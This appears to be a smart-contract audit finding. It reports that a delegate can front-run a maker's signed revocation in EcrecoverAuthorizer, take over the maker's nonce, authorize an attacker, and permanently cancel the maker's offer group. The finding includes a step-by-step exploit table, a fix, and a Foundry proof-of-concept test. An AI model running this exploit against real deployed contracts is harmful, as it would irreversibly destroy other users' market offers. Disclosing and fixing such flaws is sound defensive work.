### Title
Malicious delegate front-runs maker's EcrecoverAuthorizer revocation to permanently grief offer groups - (`src/periphery/EcrecoverAuthorizer.sol`)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` accepts signatures from any address that `Midnight.isAuthorized(authorizer, signer)` returns true for — i.e., any existing delegate of the maker. A malicious delegate can exploit this to consume the maker's current nonce with a different authorization payload, causing the maker's pending revocation to revert with `InvalidNonce`. The delegate then uses the newly authorized attacker address to call `Midnight.setConsumed(group, type(uint256).max, maker)`, permanently and irreversibly cancelling all of the maker's offers in that group.

### Finding Description

**Root cause — delegate-signed authorizations in EcrecoverAuthorizer:**

`EcrecoverAuthorizer.setIsAuthorized` (line 33–36) accepts a signature from any address that is already authorized by the maker in `Midnight`:

```solidity
require(
    signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
``` [1](#0-0) 

This means a delegate can sign an `Authorization` struct with `authorization.authorizer = maker` and any `authorized` and `isAuthorized` values they choose, and the contract will accept it as if the maker signed it.

**Nonce is consumed before signature is verified:**

Line 26 increments the nonce atomically before the signature check:

```solidity
require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());
``` [2](#0-1) 

Once the delegate's transaction lands, nonce N is consumed and the maker's pending signed message (also using nonce N) becomes permanently invalid.

**`setConsumed` with `type(uint256).max` is irreversible:**

```solidity
/// @dev Passing type(uint256).max cancels all offers in the group (and never reverts).
function setConsumed(bytes32 group, uint256 amount, address onBehalf) external {
    require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
    require(amount >= consumed[onBehalf][group], AlreadyConsumed());
    consumed[onBehalf][group] = amount;
``` [3](#0-2) 

The `AlreadyConsumed` guard enforces monotonicity — `consumed` can never decrease. Setting it to `type(uint256).max` means every subsequent `take` on any offer in that group will overflow past `maxUnits`/`maxAssets` and revert:

```solidity
newConsumed = consumed[offer.maker][offer.group] += units;
require(newConsumed <= offer.maxUnits, ConsumedUnits());
``` [4](#0-3) 

**Full exploit path:**

| Step | Actor | Call | State change |
|------|-------|------|--------------|
| 0 | maker | `Midnight.setIsAuthorized(ecrecoverAuthorizer, true, maker)` | `isAuthorized[maker][EcrecoverAuthorizer] = true` |
| 1 | maker | `Midnight.setIsAuthorized(delegate, true, maker)` | `isAuthorized[maker][delegate] = true` |
| 2 | maker | signs `Authorization{maker, delegate, false, N, deadline}`, broadcasts | pending in mempool |
| 3 | delegate | signs `Authorization{maker, attacker, true, N, deadline2}` | off-chain |
| 4 | delegate | `EcrecoverAuthorizer.setIsAuthorized(auth3, sig3)` (front-run) | `nonce[maker]→N+1`, `isAuthorized[maker][attacker]=true` |
| 5 | maker | maker's tx lands | reverts `InvalidNonce` |
| 6 | attacker | `Midnight.setConsumed(group, type(uint256).max, maker)` | `consumed[maker][group]=type(uint256).max` — permanent |

The maker can still call `Midnight.setIsAuthorized(attacker, false, maker)` directly to revoke the attacker, but `consumed[maker][group]` is already `type(uint256).max` and cannot be lowered. All offers in that group are permanently dead.

### Impact Explanation

All of the maker's offers sharing the griefed `group` are permanently cancelled — every `take` on them reverts with `ConsumedUnits` or `ConsumedAssets`. The maker cannot recover the group budget because `setConsumed` enforces strict monotonicity. The maker must redeploy offers under a new group identifier, losing any off-chain routing or aggregator integrations that referenced the old group. This directly violates the invariant: *offers cannot be replayed, overfilled, reused, or filled after cancel/deadline* — here the cancel is forced by an unauthorized third party.

### Likelihood Explanation

**Preconditions:**
1. Maker has opted into `EcrecoverAuthorizer` (`isAuthorized[maker][EcrecoverAuthorizer] = true`) — required for any signature-based authorization flow.
2. Maker has at least one active delegate (`isAuthorized[maker][delegate] = true`) — common for automated market-making setups.
3. Maker attempts to revoke the delegate via a signed message rather than a direct `Midnight.setIsAuthorized` call — plausible when the maker is a smart contract or uses a meta-transaction relay.

The front-run is straightforward: the delegate observes the mempool, constructs a valid counter-authorization (no special knowledge needed beyond their own private key and the current nonce), and submits with higher gas. The attack is repeatable — every time the maker tries to revoke via EcrecoverAuthorizer, the delegate can repeat the nonce-burn. The `setConsumed` griefing step requires only one successful front-run to cause permanent damage.

### Recommendation

Restrict `EcrecoverAuthorizer.setIsAuthorized` to accept only signatures from `authorization.authorizer` directly — remove the delegate-signing branch:

```solidity
// Before (vulnerable):
require(
    signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);

// After (fixed):
require(signer == authorization.authorizer, Unauthorized());
```

This ensures only the maker can consume their own nonce, making the nonce-based replay protection meaningful. Delegates who need to manage authorizations on behalf of a maker should do so via a direct `Midnight.setIsAuthorized` call (which already supports `onBehalf` with an authorization check) rather than through the EcrecoverAuthorizer signature path.

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {Authorization, Signature, AUTHORIZATION_TYPEHASH, EIP712_DOMAIN_TYPEHASH}
    from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";
import {IEcrecoverAuthorizer} from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";

contract FrontRunRevocationTest is BaseTest {
    bytes32 constant GROUP = bytes32(uint256(1));

    function testDelegateFrontRunsRevocationAndGriefsMakerOffers() public {
        address maker   = makeAddr("maker");
        address delegate = makeAddr("delegate");
        address attacker = makeAddr("attacker");

        // Step 0-1: maker opts into EcrecoverAuthorizer and authorizes delegate
        vm.startPrank(maker);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, maker);
        midnight.setIsAuthorized(delegate, true, maker);
        vm.stopPrank();

        uint256 nonceN = ecrecoverAuthorizer.nonce(maker); // == 0

        // Step 2: maker signs revocation (nonce=N) — simulates pending mempool tx
        Authorization memory makerRevoke = Authorization({
            authorizer: maker,
            authorized: delegate,
            isAuthorized: false,
            nonce: nonceN,
            deadline: block.timestamp + 1 days
        });
        Signature memory makerSig = _sign(makerRevoke, maker);

        // Step 3-4: delegate front-runs with Authorization{maker, attacker, true, N}
        Authorization memory delegateAuth = Authorization({
            authorizer: maker,
            authorized: attacker,
            isAuthorized: true,
            nonce: nonceN,
            deadline: block.timestamp + 1 days
        });
        Signature memory delegateSig = _sign(delegateAuth, delegate);

        vm.prank(delegate);
        ecrecoverAuthorizer.setIsAuthorized(delegateAuth, delegateSig);

        // Assert: nonce consumed, attacker now authorized
        assertEq(ecrecoverAuthorizer.nonce(maker), nonceN + 1);
        assertTrue(midnight.isAuthorized(maker, attacker));

        // Step 5: maker's revocation now reverts
        vm.expectRevert(IEcrecoverAuthorizer.InvalidNonce.selector);
        ecrecoverAuthorizer.setIsAuthorized(makerRevoke, makerSig);

        // Step 6: attacker permanently griefs maker's offer group
        vm.prank(attacker);
        midnight.setConsumed(GROUP, type(uint256).max, maker);

        // Assert: consumed is permanently maxed — all offers in group are dead
        assertEq(midnight.consumed(maker, GROUP), type(uint256).max);

        // Verify: any take on maker's offer in GROUP now reverts (ConsumedUnits)
        // (construct a minimal offer with group=GROUP, maxUnits=1, attempt take → revert)
    }

    function _sign(Authorization memory auth, address signer)
        internal view returns (Signature memory)
    {
        bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, auth));
        bytes32 domainSep  = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH,
                                block.chainid, address(ecrecoverAuthorizer)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSep, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey[signer], digest);
        return Signature({v: v, r: r, s: s});
    }
}
```

**Expected assertions:**
- `ecrecoverAuthorizer.nonce(maker) == 1` after delegate's front-run
- `midnight.isAuthorized(maker, attacker) == true`
- `ecrecoverAuthorizer.setIsAuthorized(makerRevoke, makerSig)` reverts with `InvalidNonce`
- `midnight.consumed(maker, GROUP) == type(uint256).max`
- Any subsequent `take` on an offer with `group == GROUP` and `maker == maker` reverts with `ConsumedUnits`/`ConsumedAssets`
